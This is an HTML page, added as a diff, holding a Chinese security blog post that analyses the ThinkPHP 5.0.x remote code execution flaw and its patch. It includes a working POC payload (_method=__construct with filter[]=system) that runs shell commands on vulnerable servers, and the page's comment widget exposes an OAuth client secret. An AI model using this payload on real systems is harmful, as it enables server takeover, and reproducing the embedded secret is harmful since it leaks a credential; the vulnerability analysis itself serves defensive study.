@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            ThinkPHP5.0.0~5.0.23RCE漏洞分析
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/"> 
+                    ThinkPHP5.0.0~5.0.23RCE漏洞分析 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-20   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#ThinkPHP5-0-0-5-0-23RCE漏洞分析"><span class="toc-list-text">ThinkPHP5.0.0~5.0.23RCE漏洞分析</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#TP5框架流程"><span class="toc-list-text">TP5框架流程</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#回到正题"><span class="toc-list-text">回到正题</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#POC"><span class="toc-list-text">POC</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#分析"><span class="toc-list-text">分析</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#官方补丁"><span class="toc-list-text">官方补丁</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#参考链接"><span class="toc-list-text">参考链接</span></a></li></ol>
+</div>
+            <div class="content">
+                <h1 id="ThinkPHP5-0-0-5-0-23RCE漏洞分析"><a href="#ThinkPHP5-0-0-5-0-23RCE漏洞分析" class="headerlink" title="ThinkPHP5.0.0~5.0.23RCE漏洞分析"></a>ThinkPHP5.0.0~5.0.23RCE漏洞分析</h1><p>最近TP5一直在爆洞，既然浪潮在，就有必要跟进分析一下。但是由于自己对TP5框架流程不是很了解，所以有了这篇边摸索边分析的文章。</p>
+<h1 id="TP5框架流程"><a href="#TP5框架流程" class="headerlink" title="TP5框架流程"></a>TP5框架流程</h1><p>应用启动在App.php的run()函数，说一下自己对这个框架的大致理解</p>
+<p><strong>用户请求 -&gt; 路由解析 -&gt; 调度请求 -&gt; 执行操作 -&gt; 响应输出</strong></p>
+<p><img src="https://i.loli.net/2019/01/20/5c43f7bb2d673.png" alt></p>
+<p>App.php代码部分流程如下：  (自己的理解，可能有不对的地方，望斧正<br>1、应用初始化<code>initModule()</code><br>2、run()-&gt;routeCheck()对用户的get请求进行路由检测<br>3、若注册了路由则返回相应的调度值，若路由检测无效(即没有注册路由)则返回调度值为module<br>4、根据调度值，处理不同请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">switch (self::$dispatch[&apos;type&apos;]) &#123;</span><br><span class="line">    case &apos;redirect&apos;:</span><br><span class="line">        header(&apos;Location: &apos; . self::$dispatch[&apos;url&apos;], true, self::$dispatch[&apos;status&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;module&apos;:</span><br><span class="line">       $data = self::module(self::$dispatch[&apos;module&apos;], $config);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;controller&apos;:</span><br><span class="line">        $data = Loader::action(self::$dispatch[&apos;controller&apos;], self::$dispatch[&apos;params&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;method&apos;:</span><br><span class="line">        $data = self::invokeMethod(self::$dispatch[&apos;method&apos;], self::$dispatch[&apos;params&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;function&apos;:</span><br><span class="line">        $data = self::invokeFunction(self::$dispatch[&apos;function&apos;], self::$dispatch[&apos;params&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    default:</span><br><span class="line">        throw new Exception(&apos;dispatch type not support&apos;, 10008);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>5、执行处理，返回输出。</p>
+<p>TP5中get的路由请求参数为s。若get请求时s参数不存在，则调度类型默认值为module，调度方法实现<code>self::module()</code>，即进入MVC的处理方式：Controller层调用Module处理数据返回给View到用户。</p>
+<p>所以核心操作就是调度请求。</p>
+<h1 id="回到正题"><a href="#回到正题" class="headerlink" title="回到正题"></a>回到正题</h1><p>这个漏洞的产生是因为对_method参数过滤不严导致$filter变量覆盖</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>App.php部分代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">* 执行应用程序</span><br><span class="line">* @access public</span><br><span class="line">* @param  Request $request 请求对象</span><br><span class="line">* @return Response</span><br><span class="line">* @throws Exception</span><br><span class="line">*/</span><br><span class="line">public static function run(Request $request = null)</span><br><span class="line">&#123;</span><br><span class="line">    $request = is_null($request) ? Request::instance() : $request;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        ...</span><br><span class="line">        // 获取应用调度信息</span><br><span class="line">        $dispatch = self::$dispatch;</span><br><span class="line"></span><br><span class="line">        // 未设置调度信息则进行 URL 路由检测</span><br><span class="line">        if (empty($dispatch)) &#123;</span><br><span class="line">            $dispatch = self::routeCheck($request, $config);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        $data = self::exec($dispatch, $config);</span><br><span class="line">    &#125; catch (HttpResponseException $exception) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到<code>$dispatch = self::routeCheck($request, $config)</code>，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在<code>thinkphp/library/think/Request.php:512</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">    * 当前的请求类型</span><br><span class="line">    * @access public</span><br><span class="line">    * @param bool $method  true 获取原始请求类型</span><br><span class="line">    * @return string</span><br><span class="line">    */</span><br><span class="line">public function method($method = false)</span><br><span class="line">&#123;</span><br><span class="line">    if (true === $method) &#123;</span><br><span class="line">        // 获取原始请求类型</span><br><span class="line">        return $this-&gt;server(&apos;REQUEST_METHOD&apos;) ?: &apos;GET&apos;;</span><br><span class="line">    &#125; elseif (!$this-&gt;method) &#123;</span><br><span class="line">        if (isset($_POST[Config::get(&apos;var_method&apos;)])) &#123;</span><br><span class="line">            $this-&gt;method = strtoupper($_POST[Config::get(&apos;var_method&apos;)]);</span><br><span class="line">            $this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br><span class="line">        &#125; elseif (isset($_SERVER[&apos;HTTP_X_HTTP_METHOD_OVERRIDE&apos;])) &#123;</span><br><span class="line">            $this-&gt;method = strtoupper($_SERVER[&apos;HTTP_X_HTTP_METHOD_OVERRIDE&apos;]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;method = $this-&gt;server(&apos;REQUEST_METHOD&apos;) ?: &apos;GET&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>var_method的伪装变量值为_method<br><img src="https://i.loli.net/2019/01/20/5c43fee616aac.png" alt></p>
+<p>因此通过POST一个_method参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组。在poc里看到传入的<strong>method为</strong>construct，代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">protected function __construct($options = [])</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($options as $name =&gt; $item) &#123;</span><br><span class="line">        if (property_exists($this, $name)) &#123;</span><br><span class="line">            $this-&gt;$name = $item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (is_null($this-&gt;filter)) &#123;</span><br><span class="line">        $this-&gt;filter = Config::get(&apos;default_filter&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 保存 php://input</span><br><span class="line">    $this-&gt;input = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果<br><img src="https://i.loli.net/2019/01/20/5c43f8a3b1ee9.png" alt></p>
+<p>这里也就解释了poc中为什么要传入method=get。为了使$this-&gt;method=get才能对应上面Request.php的method()方法返回值，否则程序报错</p>
+<p>request对象差不多清楚了，跟进self::routeCheck()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * URL路由检测（根据PATH_INFO)</span><br><span class="line"> * @access public</span><br><span class="line"> * @param  \think\Request $request 请求实例</span><br><span class="line"> * @param  array          $config  配置信息</span><br><span class="line"> * @return array</span><br><span class="line"> * @throws \think\Exception</span><br><span class="line"> */</span><br><span class="line">public static function routeCheck($request, array $config)</span><br><span class="line">&#123;</span><br><span class="line">    $path   = $request-&gt;path();  //path=captcha</span><br><span class="line">    $depr   = $config[&apos;pathinfo_depr&apos;];</span><br><span class="line">    $result = false;</span><br><span class="line">    </span><br><span class="line">    // 路由检测（根据路由定义返回不同的URL调度）</span><br><span class="line">    $result = Route::check($request, $path, $depr, $config[&apos;url_domain_deploy&apos;]);</span><br><span class="line">        </span><br><span class="line">    return $result;</span><br></pre></td></tr></table></figure>
+
+<p>根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method<br><img src="https://i.loli.net/2019/01/20/5c43feb394e5f.png" alt></p>
+<p>再返回App.php继续执行<code>$data = self::exec($dispatch, $config);</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">protected static function exec($dispatch, $config)</span><br><span class="line">&#123;</span><br><span class="line">    switch ($dispatch[&apos;type&apos;]) &#123;</span><br><span class="line">        ...</span><br><span class="line">        case &apos;method&apos;: // 回调方法</span><br><span class="line">            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&apos;var&apos;]);</span><br><span class="line">            $data = self::invokeMethod($dispatch[&apos;method&apos;], $vars);</span><br><span class="line">            break;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进<code>Request::instance()-&gt;param()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function param($name = &apos;&apos;, $default = null, $filter = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($this-&gt;mergeParam)) &#123;</span><br><span class="line">        $method = $this-&gt;method(true);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    // 当前请求参数和URL地址中的参数合并</span><br><span class="line">    $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br><span class="line">    $this-&gt;mergeParam = true;</span><br><span class="line">    ...</span><br><span class="line">    return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值<br><img src="https://i.loli.net/2019/01/20/5c43f82e8ae5b.png" alt></p>
+<p>继续跟进<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function input($data = [], $name = &apos;&apos;, $default = null, $filter = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    // 解析过滤器</span><br><span class="line">    $filter = $this-&gt;getFilter($filter, $default);</span><br><span class="line">    if (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进getFilter</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">protected function getFilter($filter, $default)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $filter = $filter ?: $this-&gt;filter;</span><br><span class="line">        if (is_string($filter) &amp;&amp; false === strpos($filter, &apos;/&apos;)) &#123;</span><br><span class="line">            $filter = explode(&apos;,&apos;, $filter);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $filter = (array) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line">    return $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue()<br><img src="https://i.loli.net/2019/01/20/5c43f84376fdb.png" alt></p>
+<p>从而调用call_user_func进行RCE</p>
+<h1 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h1><p>看一下diff<br><img src="https://i.loli.net/2019/01/20/5c43f86c5eec1.png" alt></p>
+<p>触发漏洞点就是method可控，进而调用任意函数。补丁对参数method进行了白名单</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a href="https://xz.aliyun.com/t/3845#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-1</a></li>
+<li><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></li>
+<li><a href="https://www.kancloud.cn/zmwtp/tp5/119426" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119426</a></li>
+<li><a href="https://www.kancloud.cn/zmwtp/tp5/119428" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119428</a></li>
+</ol>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/">https://hpdoger.cn/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2019/01/26/安恒杯月赛19新年场WriteUp/">  安恒杯月赛19新年场WriteUp</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/01/09/Code-breaking-medium֮lumenserial/"> Code-breaking-medium之lumenserial </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Sun Jan 20 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
